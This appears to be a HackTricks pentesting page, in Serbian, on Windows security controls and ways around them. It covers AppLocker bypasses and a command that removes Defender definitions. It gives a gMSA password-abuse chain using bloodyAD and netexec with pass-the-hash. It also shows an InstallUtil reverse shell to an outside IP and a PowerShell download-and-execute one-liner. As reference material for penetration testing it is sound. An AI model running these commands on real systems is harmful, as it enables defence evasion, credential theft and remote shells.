# Windows bezbednosne kontrole

{{#include ../../banners/hacktricks-training.md}}

## AppLocker pravila

Lista dozvoljenih aplikacija je spisak odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne na sistemu i da se na njemu pokreću. Cilj je da se okruženje zaštiti od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za pravljenje liste dozvoljenih aplikacija** i sistemskim administratorima omogućava kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Pruža **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows instalacionim datotekama, DLL-ovima, upakovanim aplikacijama i instalacionim programima upakovanih aplikacija.\
Organizacije često **blokiraju cmd.exe i PowerShell.exe** i pristup za pisanje u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na crnoj/beloj listi:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Ova putanja registra sadrži konfiguracije i smernice koje primenjuje AppLocker, pa omogućava pregled skupa pravila koja se trenutno sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **upisivi folderi** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **upisivi folderi** koje možete koristiti da biste **zaobišli ovo**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Često **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisana pravila takođe mogu da se zaobiđu**
  - Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** — možete da napravite **fasciklu pod nazivom `allowed`** bilo gde i biće dozvoljena.
  - Organizacije se takođe često usredsređuju na **blokiranje izvršne datoteke `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge** [**lokacije PowerShell izvršnih datoteka**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **Provera DLL-ova se veoma retko omogućava** zbog dodatnog opterećenja koje može da izazove na sistemu i količine testiranja potrebne da bi se osiguralo da se ništa neće pokvariti. Zato korišćenje **DLL-ova kao backdoor-ova može pomoći u zaobilaženju AppLocker-a**.
- Možete da koristite [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje** PowerShell koda u bilo kom procesu i zaobilaženje AppLocker-a. Više informacija potražite na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Skladištenje akreditiva

### Security Accounts Manager (SAM)

Lokalni akreditivi se nalaze u ovoj datoteci, a lozinke su heširane.

### Local Security Authority (LSA) - LSASS

**Akreditivi** (heširani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On funkcionalnosti.\
**LSA** upravlja lokalnom **bezbednosnom politikom** (politikom lozinki, dozvolama korisnika...), **autentifikacijom**, **pristupnim tokenima**...\
LSA proverava dostavljene akreditive u datoteci **SAM** (za lokalnu prijavu) i komunicira sa **kontrolerom domena** radi autentifikacije korisnika domena.

**Akreditivi** se **čuvaju** u procesu **LSASS**: Kerberos tiketi, NT i LM heševi, lozinke koje se lako dešifruju.

### LSA secrets

LSA može da sačuva neke akreditive na disku:

- Lozinku naloga računara u Active Directory-ju (kada kontroler domena nije dostupan).
- Lozinke naloga Windows servisa
- Lozinke za zakazane zadatke
- Još toga (lozinke IIS aplikacija...)

### NTDS.dit

Ovo je baza podataka Active Directory-ja. Nalazi se samo na kontrolerima domena.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je antivirus dostupan u Windows 10, Windows 11 i verzijama Windows Server-a. **Blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Ipak, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** programa **Defender**, možete da izvršite PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste utvrdili da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Možete da ga pronađete i pokretanjem sledeće komande:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS štiti datoteke šifrovanjem pomoću **simetričnog ključa** poznatog kao **File Encryption Key (FEK)**. Ovaj ključ se šifruje **javnim ključem** korisnika i čuva u **alternativnom toku podataka** $EFS šifrovane datoteke. Kada je potrebno dešifrovanje, odgovarajući **privatni ključ** digitalnog sertifikata korisnika koristi se za dešifrovanje FEK-a iz toka $EFS. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenarioji dešifrovanja bez intervencije korisnika** obuhvataju:

- Kada se datoteke ili fascikle premeste na sistem datoteka koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dešifruju.
- Šifrovane datoteke koje se šalju preko mreže pomoću protokola SMB/CIFS dešifruju se pre prenosa.

Ovaj metod šifrovanja omogućava **transparentan pristup** vlasnika šifrovanim datotekama. Međutim, samo promena lozinke vlasnika i prijavljivanje neće omogućiti dešifrovanje.

**Ključne napomene**:

- EFS koristi simetrični FEK koji se šifruje javnim ključem korisnika.
- Za dešifrovanje se koristi privatni ključ korisnika radi pristupa FEK-u.
- Do automatskog dešifrovanja dolazi pod određenim uslovima, na primer pri kopiranju na FAT32 ili prenosu preko mreže.
- Vlasnik može da pristupa šifrovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **korisnik** **koristio** ovu **uslugu** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Možete koristiti i `cipher /e` i `cipher /d` unutar fascikle da biste **šifrovali** i **dešifrovali** sve datoteke.

### Dešifrovanje EFS datoteka

#### Biti Authority System

Za ovaj način je potrebno da **korisnik žrtva** ima **pokrenut** **proces** na hostu. Ako je to slučaj, pomoću `meterpreter` sesije možete da se predstavljate kao token procesa tog korisnika (`impersonate_token` iz `incognito`). Možete i jednostavno da izvršite `migrate` u proces korisnika.

#### Poznavanje korisničke lozinke

Mimikatz dokumentuje kako da uvezete materijal korisničkog sertifikata/privatnog ključa i dešifrujete datoteke zaštićene EFS-om kada je lozinka poznata.<sup>[[6]](#references)</sup>

## Nalozi usluga kojima upravlja grupa (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** kako bi pojednostavio upravljanje nalozima usluga u IT infrastrukturama. Za razliku od tradicionalnih naloga usluga, kod kojih je često omogućena postavka "**Password never expire**", gMSA nude bezbednije rešenje kojim je lakše upravljati:

- **Automatsko upravljanje lozinkama**: gMSA koriste složenu lozinku od 240 znakova koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft Key Distribution Service (KDC), čime se uklanja potreba za ručnim ažuriranjem lozinki.
- **Poboljšana bezbednost**: Ovi nalozi ne mogu biti zaključani i ne mogu se koristiti za interaktivno prijavljivanje, što povećava njihovu bezbednost.
- **Podrška za više hostova**: gMSA mogu da se dele na više hostova, pa su pogodni za usluge koje rade na više servera.
- **Mogućnost pokretanja zakazanih zadataka**: Za razliku od managed service accounts, gMSA podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno upravljanje SPN-om**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili njegovom DNS imenu, čime se pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ovu lozinku, šifrovani podatkovni blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), mogu da preuzmu samo ovlašćeni administratori i serveri na kojima su instalirani gMSA, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potrebna je bezbedna veza kao što je LDAPS ili veza mora biti autentifikovana pomoću opcije 'Sealing & Secure'.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Ovu lozinku možete pročitati pomoću alata [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pronađite više informacija u arhiviranoj originalnoj studiji**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Ista studija objašnjava kako **NTLM relay attack** može da pribavi **gMSA lozinku** kada je relayed principal ovlašćen da čita `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Zloupotreba ulančavanja ACL-ova za čitanje gMSA lozinke (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima, korisnici sa niskim privilegijama mogu da dođu do gMSA tajni bez kompromitovanja DC-a, zloupotrebom pogrešno konfigurisanih ACL-ova objekata:<sup>[[3]](#references)</sup>

- Grupi koju možete da kontrolišete (npr. preko GenericAll/GenericWrite) dodeljeno je pravo `ReadGMSAPassword` nad gMSA-om.
- Dodavanjem sebe u tu grupu stičete pravo da čitate gMSA-ov `msDS-ManagedPassword` blob preko LDAP-a i izvedete upotrebljive NTLM akreditive.

Tipičan postupak:

1) Otkrijte putanju pomoću BloodHound-a i označite svoje foothold principale kao Owned. Potražite veze poput:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u posredničku grupu koju kontrolišete (primer pomoću bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Pročitajte gMSA upravljanu lozinku putem LDAP-a i izvedite NTLM hash. NetExec automatizuje izdvajanje vrednosti `msDS-ManagedPassword` i njeno pretvaranje u NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Autentifikujte se kao gMSA koristeći NTLM hash (nije potreban plaintext). Ako je nalog u grupi Remote Management Users, WinRM će raditi direktno:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Napomene:
- LDAP čitanje `msDS-ManagedPassword` zahteva sealing (npr. LDAPS/sign+seal). Alati to obavljaju automatski.
- gMSA nalozima se često dodeljuju lokalna prava kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste isplanirali lateral movement.
- Ako vam je potreban samo blob da biste sami izračunali NTLM, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.

Drugi ACL put je dodela prava pisanja na samom gMSA objektu. `msDS-GroupMSAMembership` je security descriptor koji određuje koji principals mogu da preuzmu upravljanu lozinku. Njegov schema GUID je `888eedd6-ce04-df40-b462-b8a50e41ba38`. ACE `WriteProperty` за taj atribut, dodeljen grupi koju kontrolišete, može da bude kandidat za izmenu liste čitalaca; to nije isto što i već biti naveden kao čitalac. Pre nego što ovaj put smatrate upotrebljivim, proverite kompletan DACL, deny i nasleđene ACE-ove, kao i efektivne dozvole. Novo članstvo u grupi zahteva i osvežen token/sesiju pre pokušaja čitanja lozinke.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim Administrator lozinkama. Te lozinke, koje su **nasumične**, jedinstvene i **redovno se menjaju**, čuvaju se centralno u Active Directory. Pristup tim lozinkama ograničen je ACL-ovima na ovlašćene korisnike. Uz dodelu dovoljnih dozvola, omogućeno je čitanje lozinki lokalnih administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, XAML-baziranih tokova rada, PowerShell klasa i još mnogo toga.

### **Provera**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Na aktuelnim verzijama Windowsa taj bypass više ne radi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Da biste ga kompajlirali, možda ćete morati da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktan bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete constrained mode. Više informacija potražite na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS politika izvršavanja

Podrazumevano je podešena na **restricted.** Glavni načini za zaobilaženje ove politike:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Više možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI bira odgovarajući protokol za autentifikaciju između dve mašine koje komuniciraju, dajući prednost Kerberos-u kada je dostupan. Ove protokole implementiraju Security Support Providers (SSP-ovi), koji se instaliraju kao DLL-ovi u Windows-u; oba učesnika moraju da podržavaju dogovoreni provider.

### Glavni SSP-ovi

- **Kerberos**: Preferirani protokol
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Iz razloga kompatibilnosti
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web serveri i LDAP, lozinka u obliku MD5 hash-a
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za dogovaranje protokola (Kerberos ili NTLM; podrazumevani je Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Dogovaranje može ponuditi više metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost pri aktivnostima sa povišenim privilegijama**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA putem ulančavanja prava do WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Zaobilaženje AppLocker-a i PowerShell Constrained Language Mode-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ dešifrovanje EFS fajlova](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - atribut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
